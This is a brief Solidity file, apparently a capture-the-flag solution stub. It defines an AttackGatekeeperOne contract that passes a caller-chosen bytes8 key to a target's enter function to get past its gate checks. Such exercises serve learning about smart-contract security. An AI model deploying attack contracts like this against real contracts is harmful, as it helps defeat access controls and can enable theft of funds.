// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperOne {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack(bytes8 payload) external {
        IGateKeeperOne(target).enter(payload);
    }
}